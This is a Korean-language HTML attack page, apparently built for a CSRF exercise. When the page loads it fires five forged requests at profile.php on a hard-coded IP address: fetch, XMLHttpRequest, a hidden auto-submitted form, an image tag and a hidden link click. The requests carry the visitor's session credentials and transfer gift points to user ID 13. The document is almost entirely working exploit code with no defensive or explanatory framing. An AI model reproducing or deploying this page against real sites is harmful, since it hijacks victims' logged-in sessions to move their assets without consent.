<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🎁 CSRF 우회 공격</title>
    <style>
        body { 
            font-family: Arial; 
            padding: 30px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            text-align: center;
        }
        .attack-container {
            background: rgba(0, 0, 0, 0.8);
            border: 3px solid #00ff00;
            padding: 40px;
            margin: 20px auto;
            border-radius: 20px;
            max-width: 800px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }
        .status {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 16px;
        }
        .method {
            background: rgba(255, 193, 7, 0.2);
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border-left: 4px solid #ffc107;
        }
    </style>
</head>
<body>
    <div class="attack-container">
        <h1>🔥 고급 CSRF 우회 공격</h1>
        <h2>🎯 다중 방식으로 ID=13 공격 중...</h2>
        
        <div id="status" class="status">
            ⏳ 공격 준비 중...
        </div>
        
        <div id="methods"></div>
        <div id="results"></div>
    </div>

    <script>
        let methods = [
            {name: "직접 fetch 공격", type: "fetch"},
            {name: "XMLHttpRequest 공격", type: "xhr"}, 
            {name: "동적 폼 생성 공격", type: "form"},
            {name: "이미지 태그 공격", type: "img"},
            {name: "링크 클릭 시뮬레이션", type: "link"}
        ];
        
        let results = [];
        let currentMethod = 0;

        function updateStatus(message) {
            document.getElementById('status').innerHTML = message;
        }

        function updateMethods() {
            let html = '<h3>🔧 시도할 공격 방법들:</h3>';
            methods.forEach((method, index) => {
                let status = '';
                if (index < currentMethod) status = ' ✅';
                else if (index === currentMethod) status = ' 🔄';
                else status = ' ⏳';
                
                html += `<div class="method">${method.name}${status}</div>`;
            });
            document.getElementById('methods').innerHTML = html;
        }

        function updateResults() {
            let html = '<h3>📊 공격 결과:</h3>';
            results.forEach(result => {
                html += `<div class="status">${result}</div>`;
            });
            document.getElementById('results').innerHTML = html;
        }

        // 방법 1: Fetch API
        async function fetchAttack() {
            try {
                const formData = new FormData();
                formData.append('gift_type', 'coffee');
                formData.append('points', '100');
                formData.append('message', 'fetch공격');
                formData.append('gift_to', '13');

                const response = await fetch('http://3.36.66.216/profile.php', {
                    method: 'POST',
                    body: formData,
                    credentials: 'include',
                    mode: 'no-cors'
                });
                
                results.push('🚀 Fetch 공격: 전송 완료 (응답 확인 불가)');
                console.log('[FETCH] 공격 전송됨');
            } catch (error) {
                results.push('❌ Fetch 공격: ' + error.message);
                console.log('[FETCH] 오류:', error);
            }
        }

        // 방법 2: XMLHttpRequest
        function xhrAttack() {
            try {
                const xhr = new XMLHttpRequest();
                const formData = new FormData();
                formData.append('gift_type', 'flower');
                formData.append('points', '150');
                formData.append('message', 'xhr공격');
                formData.append('gift_to', '13');

                xhr.open('POST', 'http://3.36.66.216/profile.php', true);
                xhr.withCredentials = true;
                
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        results.push('🚀 XHR 공격: 완료 (상태: ' + xhr.status + ')');
                        updateResults();
                    }
                };
                
                xhr.send(formData);
                console.log('[XHR] 공격 전송됨');
            } catch (error) {
                results.push('❌ XHR 공격: ' + error.message);
                console.log('[XHR] 오류:', error);
            }
        }

        // 방법 3: 동적 폼 생성
        function dynamicFormAttack() {
            try {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = 'http://3.36.66.216/profile.php';
                
                const fields = {
                    'gift_type': 'cake',
                    'points': '200',
                    'message': '폼공격',
                    'gift_to': '13'
                };

                Object.keys(fields).forEach(key => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = fields[key];
                    form.appendChild(input);
                });

                document.body.appendChild(form);
                form.submit();
                
                results.push('🚀 동적 폼 공격: 제출 완료');
                console.log('[FORM] 동적 폼 제출됨');
            } catch (error) {
                results.push('❌ 동적 폼 공격: ' + error.message);
                console.log('[FORM] 오류:', error);
            }
        }

        // 방법 4: 이미지 태그 (GET 요청)
        function imageAttack() {
            try {
                const img = new Image();
                img.src = 'http://3.36.66.216/profile.php?gift_type=diamond&points=250&message=img공격&gift_to=13';
                img.onload = () => results.push('🚀 이미지 공격: 로드 완료');
                img.onerror = () => results.push('⚠️ 이미지 공격: 에러 (하지만 요청은 전송됨)');
                
                console.log('[IMG] 이미지 요청 전송됨');
            } catch (error) {
                results.push('❌ 이미지 공격: ' + error.message);
                console.log('[IMG] 오류:', error);
            }
        }

        // 방법 5: 숨겨진 링크 클릭
        function linkAttack() {
            try {
                const link = document.createElement('a');
                link.href = 'http://3.36.66.216/profile.php?gift_type=coffee&points=300&message=link공격&gift_to=13';
                link.target = '_blank';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                
                results.push('🚀 링크 공격: 클릭 완료');
                console.log('[LINK] 링크 클릭됨');
            } catch (error) {
                results.push('❌ 링크 공격: ' + error.message);
                console.log('[LINK] 오류:', error);
            }
        }

        // 순차적으로 모든 공격 실행
        async function executeAllAttacks() {
            updateStatus('🔥 다중 CSRF 공격 시작...');
            updateMethods();

            const attacks = [fetchAttack, xhrAttack, dynamicFormAttack, imageAttack, linkAttack];

            for (let i = 0; i < attacks.length; i++) {
                currentMethod = i;
                updateMethods();
                updateStatus(`🚀 ${methods[i].name} 실행 중...`);

                try {
                    await attacks[i]();
                } catch (error) {
                    console.error(`공격 ${i+1} 오류:`, error);
                }

                updateResults();
                await new Promise(resolve => setTimeout(resolve, 2000)); // 2초 대기
            }

            currentMethod = attacks.length;
            updateMethods();
            updateStatus('🎉 모든 공격 완료! 결과를 확인하세요.');
        }

        // 페이지 로드 시 자동 실행
        window.addEventListener('load', function() {
            console.log('🔥 고급 CSRF 공격 시작');
            executeAllAttacks();
        });
    </script>
</body>
</html>
